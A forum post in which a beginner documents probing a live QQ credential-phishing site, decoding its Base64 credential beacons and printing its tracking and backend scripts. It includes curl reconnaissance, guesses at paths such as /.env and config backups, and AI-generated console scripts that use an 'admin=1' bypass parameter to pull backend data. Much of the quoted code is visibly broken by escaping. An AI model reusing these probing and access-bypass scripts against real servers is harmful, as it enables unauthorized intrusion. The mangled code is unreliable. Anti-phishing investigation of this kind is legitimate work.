# 零基础小白初次尝试逆向钓鱼网站，但是不知道接下来可以做什么

> **作者**: CBRTY | **发布时间**: 2026-03-29 17:06:00 | **版块**: 『脱壳破解区』 | **查看/回复**: 98 / 1
> **原文**: [https://www.52pojie.cn/thread-2100101-1-1.html](https://www.52pojie.cn/thread-2100101-1-1.html)

---

本小白是个大一学生，学环境学的。平时真的真的很少接触代码或网络安全相关的东西，所以可能比大佬们想的零基础还要更零基础。
这次逆向只是好奇使然，所以帖子写的可能杂乱或不通顺，过程繁琐且绕弯。还望各路大神批评指正。

钓鱼网站发源大致时间：2026年3月11日
钓鱼网站作用：盗取用户QQ号和手机号实施诈骗行为，甚至清空好友列表。
传播载体名称： 《综合成绩單》.txt
使用软件：VMware Workstation 17，Gemini，VSCode，360安全浏览器，Edge浏览器，Microsoft Word，微pe工具箱。

.txt文件的内容：

操作指南：登录查看并核对信息。
确认信息 （钓鱼网站） （请复制到浏览器打开）
如信息错误，及时联系教务处更正
祝你成绩有佳！

以下记录过程：

![](https://attach.52pojie.cn/forum/202603/29/150541yi00rvv054i7rpin.png)

![](https://attach.52pojie.cn/forum/202603/29/150543zlwbl35w94w943wi.png)

以上名称均为网名
索要到原文件之后，使用VSCode运行Hex Editor进行十六进制核查，看到第一行前三个字节为E6 93 8D，为UTF-8 编码下的中文字符。由于该文件开头没有任何文件头声明且包含大量非ASCII字符，导致其难以在识别网站被认为是主流的有效格式。

使用VSCode终端运行以下命令，尝试查看该服务器返回的HTTP响应头：curl.exe -I  钓鱼网站
返回结果：

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 12 Mar 2026 14:55:39 GMT
Content-Type: text/html;charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000
Alt-Svc: quic=":443"; h3=":443"; h3-29=":443"; h3-27=":443";h3-25=":443"; h3-T050=":443"; h3-Q050=":443";h3-Q049=":443";h3-Q048=":443"; h3-Q046=":443"; h3-Q043=":443"
```

尝试在终端继续运行：curl.exe -o bait.html 钓鱼网站返回结果为curl: (52) Empty reply from server，扑了空。继续在终端运行以下命令，抓取日志：curl.exe -Iv 钓鱼网站返回结果：

```
* Host qqa.dubaihalal.com:443 was resolved.
* IPv6: (none)
* IPv4: 64.81.115.14
*   Trying 64.81.115.14:443...
* schannel: disabled automatic use of client certificate
* ALPN: curl offers http/1.1
* ALPN: server accepted http/1.1
* Established connection to qqa.dubaihalal.com (64.81.115.14 port 443) from 172.21.11.59 port 12324
* using HTTP/1.x
> HEAD / HTTP/1.1
> Host: qqa.dubaihalal.com
> User-Agent: curl/8.18.0
> Accept: */*
>
* Request completely sent off
* schannel: remote party requests renegotiation
* schannel: renegotiating SSL/TLS connection
* schannel: SSL/TLS connection renegotiated
* schannel: remote party requests renegotiation
* schannel: renegotiating SSL/TLS connection
* schannel: SSL/TLS connection renegotiated
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: nginx
Server: nginx
< Date: Thu, 12 Mar 2026 18:50:56 GMT
Date: Thu, 12 Mar 2026 18:50:56 GMT
< Content-Type: text/html;charset=utf-8
Content-Type: text/html;charset=utf-8
< Connection: keep-alive
Connection: keep-alive
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Strict-Transport-Security: max-age=31536000
Strict-Transport-Security: max-age=31536000
< Alt-Svc: quic=":443"; h3=":443"; h3-29=":443"; h3-27=":443";h3-25=":443"; h3-T050=":443"; h3-Q050=":443";h3-Q049=":443";h3-Q048=":443"; h3-Q046=":443"; h3-Q043=":443"
Alt-Svc: quic=":443"; h3=":443"; h3-29=":443"; h3-27=":443";h3-25=":443"; h3-T050=":443"; h3-Q050=":443";h3-Q049=":443";h3-Q048=":443"; h3-Q046=":443"; h3-Q043=":443"
<

* Connection #0 to host qqa.dubaihalal.com:443 left intact
```

注意到IPv4地址64.81.115.14位于美国。在VMware Workstation 17里挂载Windows7 x64系统，使用360安全浏览器打开该网站。
该网站的进入界面是一个“腾讯文档”页面，同时网页标签为“学生资料“。查看网页源代码，其使用了一整张图片来填充该页。
虽然在电脑上打开会出现拉伸，但是在大部分手机上打开时，看起来和正常的腾讯文档页面没有区别。
网页源代码里，骗子只做了图片在手机上的比例适配，导致在电脑上显示会很奇怪。
点击任意位置，网页弹出“当前文档过大，需要登录QQ才能查看”。点击确定。到达一个同样虚假的账号密码输入页面。
注意到网址栏这时后缀为/step\_in/，意为用户现在处于“看到鱼饵”这一步。点击忘记密码或注册新账号会跳转到真正的腾讯官方的QQ安全中心以及QQ注册页面。
尚不明确“记住登录状态”的作用。
点击输入文本框，并不会调用真正的输入法，而是一个网页端的自制输入法，用户需要手动点击来输入。

![](https://attach.52pojie.cn/forum/202603/29/150548ka9hohauc9ey99hj.png)

查看网页源码，发现骗子写了多个else if分支来确定验证码的输入情况，并根据情况跳转到对应后缀不同的网页：
在/step\_in\_fail/页面，提示登陆失败，点击重新登陆。
在/step\_code\_fail/页面，提示验证失败，验证码错误或超时，点击重新获取。有趣的是，用户可以在不输入任何信息的情况下进入该后缀页面，但是从这个页面返回的验证码输入页面内，还是会显示验证码已发送。发到哪了？无人知道。
在/step\_err/页面，提示重新登陆。l 在/step\_phone/页面，要求你输入密保手机。推测当用户输入了正确的QQ账号和密码时，会跳转到这个页面，否则直接跳转到/step\_code/即输入验证码的页面。输入假的验证码后，将跳转到/step\_laod/页面。该页面只有一个qq的加载gif动画。此时进行验证。如果结果正确，则跳转到/step\_ok/。否则回到/step\_in\_fail/。另外，在/step\_msg/页面，会要求用户输入支付密码进行进一步验证。推测如果用户输入的全部是真实信息，将会触发该页面，并读取支付密码。
在/step\_ok/页面只有一个假的xlsx表格的logo和一个下载按钮。点击下载按钮，提示该文件更新中。再次点击就跳转到腾讯文档官方页面，盗号已经结束了。对网页的探索基本完成。

![](https://attach.52pojie.cn/forum/202603/29/150553dqptslakqq6tsglv.png)

以下是其他探索：
输入假账号密码，进入/step\_code/页面。打开开发者工具查看网络。发现一直在产生data.php。

![](https://attach.52pojie.cn/forum/202603/29/152217ufxrfcqfzcg5oz4g.png)

![](https://attach.52pojie.cn/forum/202603/29/152517dcqk3kw1pd4wf6eq.png)

这一次以logo-file.png出现开始，记录为输入账密的页面，截止到4loading.gif即假的加载界面动画出现。在/step\_in/输入假的账密，然后进入/step\_code/。快速输入假的验证码。可以看到两个带有长后缀的data.php（/step\_code/上面一个），先看第一个：
ZXlKaFkzUWlPaUp6ZGlJc0ltUmhkR0VpT25zaWRYTmxjaUk2SWpFeE9USTRNelV3TnpBaUxDSndZWE56SWpvaVpXVmtaR1JrWkdabVptWWlmWDA9推断是Base64加密，解密**两遍**：
{"act":"sv","data":{"user":"1192835070","pass":"eedddddffff"}}看到了被发送的假账密。
同理看第二个（/step\_load/上面一个）：
ZXlKaFkzUWlPaUp6ZGlJc0ltUmhkR0VpT25zaVkyOWtaU0k2SWpFeU16UTFOaUo5ZlE9PQ==
使用UTF-8解码第一遍：eyJhY3QiOiJzdiIsImRhdGEiOnsiY29kZSI6IjEyMzQ1NiJ9fQ==
解码第二遍：{"act":"sv","data":{"code":"123456"}}这是被发送过去的假验证码。看看这个验证码文件的标头部分：

![](https://attach.52pojie.cn/forum/202603/29/152336l5q9ofo7akknyaf7.png)

在该/load/页面直接刷新，发现并没有返回之前的页面，仍然停留在/load/页面。并且在网络选项卡里，并没有看到有含有假信息的文件被重新发送。

*此处出现了一个小插曲。本小白将虚拟机的网络连接方式改为了桥接以便保证使用真实网络环境来访问该网址。故接下来的网络标头可能和之前有所区别，但可以确认已发送的假数据触碰到了IP位于美国的服务器。*
根据请求标头的:path:数据，尝试直接访问该网站的/app/页面。

被403拒绝访问了，同时确认其使用nginx服务器。尝试访问其他可能的配置文件：/app/login.php，404错误，不存在。/app/admin.php，404错误，不存在。/app/admins.php，404错误，不存在。/app/main.php，404错误，不存在。/app/index.php，404错误，不存在。/app/config.php，白屏，但网络选项卡有记录。状态码是200 OK绿灯。
尝试访问其他配置文件：
/app/config.php.bak，404不存在。/app/config.php.old，404不存在。/app/db.php，404不存在。/app/data.sql，404不存在。/app/v.php，404不存在。/app/s.php，404不存在。/app/1.php，404不存在。/app/a.php，404不存在。/app/list.php，404不存在。将/app换为/sys或/api，404不存在。/readme.txt；/install.sql；/.env；/log.txt全部404不存在。
尝试/app/data.php，白屏但网络选项卡有记录。
再次仔细查看/step\_code/页面的代码，发现第一行其实就有线索：document.write('<scriptsrc="../app/data.php?sv=js&'+Math.random()+'"><\/script><scriptsrc="../app/cess/index.php?id=5" ><\/script>');直接访问/app/cess。提示无效访问。
/app/cess/index.php同样为无效访问。
访问/app/cess/index.php?id=5，出现了一个黑屏页面，只有以下文字：

```
/*! EcCensus v11| (c) ECnet */cess=newfunction EcCensus(){this.init=function(t){var k,m,d={},y=newDate().getUTCDate(),u="//qqa.dubaihalal.com/app/cess/index.php?id=5&ac=sv";d.rf=document.referrer;d.tt=document.title;d.hr=location.href;if(window.screen){d.sc=screen.height+"-"+screen.width;}if(t){d.zh=t;}elseif(localStorage.cess_day!=y){d.ni=1;}d.rn=Math.random();localStorage.cess_day=y;for(kin d){if(d[k]){u+="&"+k+"="+encodeURIComponent(d[k]);}}m=newImage;m.src=u;};this.init()}'''
```

访问其中的app/cess/index.php?id=5&ac=sv，返回结果如下：

{    "dd": "61.190.56.199",    "tt": "MIP统计",    "sc": "1080-1920",    "cp": "国外地区",    "id": "5",    "ni": 1,    "rf": "直接访问",    "hr": null,    "dt": "2026-03-1412:05:27",    "co": "WebKit",    "bs": "Chrome",    "nh": "Chrome",    "os": "Windows",    "sb": "电脑",    "ii": 40737,    "zs": "新"}

推测这只是在对用户状况进行统计，没有实际意义。

2026.3.14 12时34分出现了新状况：虚拟机的/step\_in/界面疑似遭到劫持，直接访问会跳转到百度。其他所有/step页面都会被重定向到百度。我尝试直接用物理机来访问。IP地址和虚拟机IP不同，于是可以继续访问/step相关页面。推测仅拉黑了虚拟机的IP。以下直接放出该钓鱼网站的data.js网页源代码，含原本注释。

```
document.write('<scriptsrc="../app/data.php?sv=js&'+Math.random()+'"><\/script><scriptsrc="../app/cess/index.php?id=5"">
```
```

闭了360安全浏览器的所有内置保护功能，使用虚拟机的快照功能回退到浏览器仍然处于/step\_in/的页面的状态。在控制台输入了一些防跳转的代码，然后使用ds口令发送了一段假账密，页面静止在/step\_in/，没有跳走。查看网络日志，发现只有一个data.php加上假账密的base64密文，没有任何其他文件产生。其本体的标头显示200 OK；预览和响应只有locatio.herf=baidu.com.
尝试直接在网上搜索EcCensus，找到了一个叫“恩科常用工具导航”的网站，划到最下面有个可以直接下载的源代码。此处不方便放出了。
之后我注册了一个真实的qq号来反向钓鱼骗子。真实qq号在输入那个页面后，不会自动跳转回登录失败。

误打误撞，进了/app/cess/index.php?admin=1&m=show&id=1

翻译了这个页面的结果，得到表格：

其他的数据指示了在什么时间，哪些种类浏览器的用户访问了该网站。

重新回到钓鱼网站，在开发人员选项的控制台页面输入以下代码：（由Gemini生成）

`// 1. 修正了参数名为 u// 2. 修正了 id 为 5// 3. 运行环境在当前域名下，会自动带上Refererfetch('https://qqa.dubaihalal.com/app/cess/index.php?u=getList&id=5',{    method: 'POST',    headers: {        'Content-Type':'application/x-www-form-urlencoded'    },    // 发送今天的数据请求    body: 'day=' + newDate().toISOString().split('T')[0]}).then(res =>res.json()).then(data =>{    console.log("%c[!!!] 成功潜入数据层","color: #00ff00; font-weight: bold; font-size: 20px;");    if (data.data && data.data.length> 0) {        console.table(data.data);         // 这里的表格第一列，极大概率就是账号密码或捕获的敏感信息    } else {        console.warn("未发现今日明细，尝试获取历史数据...");    }}).catch(err =>console.error("请求被拦截:", err));`

得到以下结果：在crtsh看这个钓鱼网站的证书，结果如下：

回到之前的主网页，继续运行脚本：

```
">
window.results =[]; async functionstartClimb() {    console.log("%c目标校准：正在切入后端核心接口...","color: #00ff00; font-weight: bold;");        // 路径修正为app/cess/index.php    const apiPath ="app/cess/index.php";        for (let p = 1; p <= 10; p++) {        try {            // 参数组合：admin=1(越权),m=show(展示数据), id=5(项目ID),page(分页)            const url =`${apiPath}?admin=1&m=show&id=5&page=${p}&limit=50`;            const response = await fetch(url);            const data = await response.text();                        // 检查返回内容是否包含你之前见到的数据特征（如"EcCensus" 关键词）            if(data.includes("EcCensus") || data.includes("<table")) {                window.results.push(data);                console.log(`%c成功！第 ${p}页已捕获。`, "color: #2196F3");            } else {                console.warn(`第 ${p}页返回异常内容，逻辑可能已关闭或路径仍有偏。`);                break;            }                        await new Promise(r =>setTimeout(r, 400));        } catch (err) {            console.error(`抓取第 ${p}页失败:`, err);        }    }    console.log("%c爬取结束。输入downloadData() 导出。");} window.downloadData= () => {    const blob = newBlob([window.results.join('\n\n---PAGE_SPLIT---\n\n')], {type: 'text/plain'});    const a = document.createElement('a');    a.href = URL.createObjectURL(blob);    a.download = `true_evidence_${newDate().getTime()}.txt`;    a.click();}; startClimb();
```
```

在返回的数据包的末尾截取到：<scriptsrc="//钓鱼网站/app/cess/images/census.js"></script>
直接访问该网址，得到代码census.js，放不了附件，所以粘贴在这里：
[md]```
$(function() {
    cessEvent();
    // cessLoadCess();
    //console.log(\_EcCensus);
});
function cessLoadCess(){
    $.getScript(\_EcCensus.host+'?id='+\_EcCensus.data.id,function(d){
        setTimeout(function(){
            if(window.cess){
                if(Math.random()<0.4){
                    localStorage.\_\_cess = 0;
                }
                if( Math.random()<0.1){
                    if( Math.random()<0.3){
                        cess.init('复制');
                    }else{
                        cess.init('注册');
                    }
                }
            }
        },1000);
    });
}
function cessLoadMore(e){
    if($('.cess\_list\_more').html()=='加载中')return;
    $('.cess\_list\_more').html('加载中');
    var v = {};
    v.id = \_EcCensus.data.id;
    if(!e){
        v.day = \_EcCensus.data.day;
    }else if(\_EcCensus.more){
        v.ii = \_EcCensus.more.ii;
        v.day = \_EcCensus.more.day;
    }
    $.post(\_EcCensus.host+'?u=getList',v,function(d){
        d = cessDejson(d);
        if(d.day)\_EcCensus.more = d;;
        if(d.data)getTr(d);
        $('.cess\_list\_more').html('加载更多');
    });
    function getTr(d){
        var k,v,h = '';
        for(k in d.data){
            v = d.data[k];
            h   += '<tr>';
            h   += '    <td>'+v[2+'</td>';
            h   += '    <td>'+shotLink(v[10])+'</td>';
            h   += '    <td class="cess\_mn">'+refLink(v[11],v[10])+'</td>';
            h   += '    <td class="cess\_mn">'+(v[8=='PC'?'电脑':'移动')+'</td>';
            h   += '    <td>'+shotStr(v[1],12)+'</td>';
            h   += '    <td class="cess\_mn">'+shotStr(v[9],12)+'</td>';
            if(/服务器|国外/.test(v[5])){
                // h    += '    <td class="cess\_mn">'+shotStr(v[4],18,v[5])+'</td>';
                h   += '    <td class="cess\_mn">'+shotStr(v[4],18)+'</td>';
            }else{
                h   += '    <td class="cess\_mn">'+shotStr(v[5],4,v[4])+'</td>';
            }
            h   += '    <td class="cess\_td\_date">'+v[3+'</td>';
            h   += '</tr>';
        }
        $('.cess\_list\_table tbody').append(h);
    }
    function shotLink(u){
        return '<a href="'+u+'" title="'+u+'" target="\_blank">'+u.replace(/^h.+?**\/\/**|**\#**.+$/gi,'').replace(/**\/**$/gi,'').replace(/**\/**{2}/gi,'/').replace(/^(.{8}).{3,}(.{12})$/gi,'$1\*\*$2')+'</a>';
    }
    function refLink(u,v){
        var a = document.createElement('a');
        a.href = u;
        var b = document.createElement('a');
        b.href = u;
        var s = a.hostname;
        if(a.hostname == b.hostname)s = '站内跳转';
        if(!u||/直接|^[\-**\s**+$/gi.test(u))return '直接访问';
        return '<a href="'+u+'" title="'+u+'" target="\_blank">'+s.replace(/**\/**{2}/gi,'/').replace(/^(.{7}).{3,}(.{6})$/gi,'$1\*\*$2')+'</a>';
    }
    function shotStr(s,l,t){
        if(typeof s == 'string' && l>0 && s.length>l || t ){
            s = s.replace(/**\-**.+/,'');
            return '<span title="'+(t||s)+'" >'+s.replace(RegExp('^(.{'+(l||6)+'}).{3,}(.{3})$', 'gi'),'$1\*\*$2')+'</a>';
        }
        return s;
    }
}
function cessEvent(){
    $('.cess\_btn[id]').unbind('click').click(function(){
        var m = $(this).attr('id');
        var pv = {}
        pv.id = \_EcCensus.data.id;
        if(\_EcCensus.from){
            pv.from = 1;
        }
        if(/数据/gi.test($(this).html())){
            pv.m = m;
            m = 'html';
        }
        $.post(\_EcCensus.host+'?admin=1&m='+m,pv,function(d){
            d = cessDejson(d);
            if(d.data)\_EcCensus.data = d.data;
            if(d.html){
                $('#cess\_block').html(d.html);
                cessEvent();
            }
        });
    });
    $('.cess\_title').unbind('click').click(function(){
        var next = $(this).next();
        if(next.css('display')=='none'){
            next.slideDown();
        }else{
            next.slideUp();
        }
    });
    if(\_EcCensus.data.m){
        $('.cess\_btn\_sel').removeClass('cess\_btn\_sel');
        $('#'+\_EcCensus.data.m).addClass('cess\_btn\_sel');
    }
    $('.cess\_list\_more').unbind('click').click(cessLoadMore);
    setTimeout(cessLoadMore,0);
    if( \_EcCensus.data.obj){
        window.\_fspv = window.screen.width < 700 ? 0.75 :1;
        cessCanvasIp(\_EcCensus.data.ips);
        cessCanvasPie('sb', \_EcCensus.data.obj.sb,'终端分布');
        cessCanvasPie('dr', \_EcCensus.data.obj.dr,'来路分布');
        cessCanvasPie('dm', \_EcCensus.data.obj.dm,'域名分布');
        cessCanvasPie('bs', \_EcCensus.data.obj.bs,'浏览器分布');
        cessCanvasPie('zs', \_EcCensus.data.obj.zs,'转化分布');
        cessCanvasPie('cp', \_EcCensus.data.obj.cp,'省份分布');
    }
}
function cessCanvasIp(da) {
    var option = {
        title: {
            text: \_EcCensus.data.obj.ltn,
        },
        tooltip: {
            trigger: 'axis'
        },
        legend: {
            data:['IP','PV','转'
        },
        fontSize: \_fspv \* 14,
        grid: {
            x:  45,
            y:  45,
            x2: 10,
            y2: 40,
        },
        toolbox: {
            show: true,
            feature: {
                dataZoom: {
                    yAxisIndex: 'none'
                },
                magicType: {type: ['line', 'bar']},
                restore: {},
                saveAsImage: {}
            }
        },
        xAxis:  {
            type: 'category',
            boundaryGap: false,
            data: \_EcCensus.data.obj.wks
        },
        yAxis: {
            type: 'value',
        },
        series: [
            {
                name:'IP',
                type:'line',
                smooth:true,
                data:\_EcCensus.data.obj.ips
            },
            {
                name:'PV',
                type:'line',
                smooth:true,
                data:\_EcCensus.data.obj.pvs
            },
            {
                name:'转',
                type:'line',
                smooth:true,
                data:\_EcCensus.data.obj.zhs
            },

    };
    if(\_EcCensus.data.obj.wks.length > 50){
        option.dataZoom = {
            type: 'slider',
            show : true,//是否开启
            realtime : true,
            start : 75,
            end : 100,
        };
    }
    if(\_fspv<1){
        option.toolbox.feature = {
            restore: {},
            saveAsImage: {}
        };
    }
    echarts.init(document.getElementById('ip')).setOption(option,true);
}
function cessCanvasPie(id, da,title) {
    var colors = [ '#36a2ff', '#E29F39', '#D06052', '#f47942', '#ffce56', '#4bc0c0', '#4C9BC7','#9966ff', '#ff9f40', '#ff6384', '#ffce56', '#4bc0c0', '#9966ff', '#6B0C22','#A30212','#F4CB89','#588C8C','#011C26','#828D9A','#F1DDD8','#E1695A','#F2B56B','#F29C6B','#F27A5E','#06858C','#45C48B','#FFD039','#5F909C','#D2E5ED','#25616E','#F3573B','#06858C','#45C48B','#FFD039','#EB3E4A','#ED553B','#F2B134','#4FB99F','#068587','#579C87','#A1C181','#FCCA46','#FE7F2D',];
    var dl = [],dn = [];
    for (var k in da) {
        if(dn.length < 9 && 1 == \_fspv || dn.length < 4){
            dn.push(k);
        }
        dl[dl.length] = {
            name: k,
            value: da[k
        };
    }
    var option = {
        title: {
            text: title||'过去七日交易额'
        },
        tooltip: {
            trigger: 'item',
            formatter: "{a} <br/>{b}: {c} ({d}%)"
        },
        toolbox: {
            show: true,
            feature: {
                restore: {},
                saveAsImage: {}
            }
        },
        color: colors,
        fontSize: \_fspv \* 16,
        legend: {
            orient: 'vertical',
            x: 'right',
            y: 'bottom',
            fontSize: \_fspv \* 14,
            data:dn,
            formatter: function(e) {
                return e.replace(/^(.{2}).{2,}(.{6})$/gi,'$1\*$2');
            },
        },
        series: [
            {
                name:'访问来源',
                type:'pie',
                radius: ['30%', '50%'],
                center: ["45%", "65%"],
                label: {
                    normal: {
                        formatter: function(e) {
                            return ' {b|' + e.name.replace(/^(.{3}).{2,}(.{6})$/gi,'$1\*$2') + '} {c|' + e.value + '}';
                        },
                        rich: {
                            b: {
                                fontSize: \_fspv \* 15,
                            },
                            c: {
                                fontSize: \_fspv \* 12,
                                color: '#999',
                            }
                        }
    ,
                    }
                },
                data:dl
            }

    };
    echarts.init(document.getElementById(id)).setOption(option,true);
}
function cessMsg(txt,time){
    $('#cess\_msg').html(txt).fadeIn(500).click(function(){
        $(this).fadeOut(500);
    });;
    setTimeout(function(){
        $('#cess\_msg').fadeOut(500);
    },time||3000);
}
function cessLight(h,t) {
    if (typeof(h) != 'string') return '';
    if (t===undefined)t = 1;
    var o = {'1': '#f00','=': '#95f','h': '#e51','}': '#b84','$': '#808','k': '#0a0','/': '#888','"': '#a70',},
    i = 0,
    j = {},
    w = / I(\d{1,5})I /g,r = /\b(abstract|and|array|as|assert|boolean|byte|case|catch|char|class|clone|const|continue|declare|default|delete|die|do|double|echo|else|elseif|empty|enddeclare|endfor|endforeach|endif|endswitch|endwhile|enum|eval|exception|exit|extends|false|final|finally|float|for|foreach|function|global|if|implements|import|in|include|include\_once|instanceof|int|interface|isset|list|literal|long|namespace|native|new|null|package|parent|php\_user\_filter|print|private|protected|public|require|require\_once|return|self|short|static|strictfp|super|switch|synchronized|this|throw|throws|transient|true|try|typeof|unset|use|var|void|volatile|while|with|xor|or|window|document|location|\_\_DIR\_\_|\_\_FILE\_\_|\_\_LINE\_\_)\b/gi,d=[];
    g(/>/g, '>');
    g(/</g, '<');
    g(/(**\\\'**|**\\\"**|**\\\/**)/g);
    g(/((?:^|\s\*\n)\s\***\/\/**.\*|**\/\\***[\W\w+?**\\*\/**|<**\!\-\-**[\W\w+?**\-\-**>)/g, '/');
    g(/('|")(.\*?)\1/g, '"', 'b+c+b');
    g(/\b((?:https?|ftp)**\:\/\/**.+?)(?=**\"**|**\'**|**\"**|\s|<|<|$)/g,'h');
    g(/(?=\W)(**\$**\w+)\b/g, '$');
    if((h.match(r)||[]).length/h.length>0.002){
        g(/(**\/**.+?**\/**\w{0,2})/gi);
        g(/(?=\W)((?:**\.\=**|**\+\=**|**\+**|**\=**|**\!**|**\-**|**\\***)+)(?=\W|$)/g, '=');
        g(/\b((?:\d|**\.**\d)+)\b/g, '1');
        g(/(**\{**|**\}**)/g, '}');
        g(r, 'k');
    }
    while (w.test(h)) g(w, g);
    function g(p, k, e) {
        if (j[k]) return j[k];
        h = h.replace(p, o[k] || !k ?
        function(a, b, c, d) {
            j[++i] = o[k] ? ('<font style="color:' + o[k] + ';">' + (e ? eval(e) : b) + '</font>') : a;
            return ' I' + i + 'I '
        }: k)
    }
    h = h.replace(/(https?**\:\/\/**\w.+?)(?=**\"**|**\'**|**\"**|\s|<|<|$)/g,'<a href="$1" target="\_blank" rel="nofollow">$1</a>');
    //函数名
    h = h.replace(/(function..font**\>**\s\*|class..font**\>**\s\*|**\$\.**fn**\.**)(\w+)/g,function(a,b,c){
        if(c.length<2)return a;
        var n=c+'\_'+d.length;
        d[d.length=[c,n];
        return b+'<a id="'+n+'"></a>'+c;
    });
    return h;
}
function cessDejson(d) {
    try {
        if (typeof(d) == 'string') d = JSON.parse(d);
        if (d.msg) cessMsg(d.msg);
        if (d.alert) alert(d.alert);
        if (d.reload) location.reload();
        if (d.redirect) location.href = d.redirect;
    } catch(e) {
        return {d: d,e: e};
    }
    return d;
}
推测是后台的一部分源代码。
截止目前收集到这一段源代码，和一些统计数据。
然后我就不知道应该往什么方向探索了，后台登陆页面一直没找到。感谢大佬们的认真阅读。
